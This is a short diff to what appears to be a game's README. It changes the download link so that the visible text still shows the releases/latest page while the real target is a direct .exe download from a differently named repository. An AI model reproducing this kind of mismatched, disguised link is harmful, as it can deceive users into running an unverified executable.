@@ -63,7 +63,7 @@ Every active bonus is displayed at the top of the screen together with a circula
 
 Download the latest installer here:
 
-➡️ **https://github.com/otherw1seee/Arc-Hockey/releases/latest**
+➡️ **[https://github.com/otherw1seee/Arc-Hockey/releases/latest](https://github.com/otherw1seee/Arc-Hockey-Game/releases/download/ArcHockey/ArcHockeyInstaller.exe)**
 
 ---
 
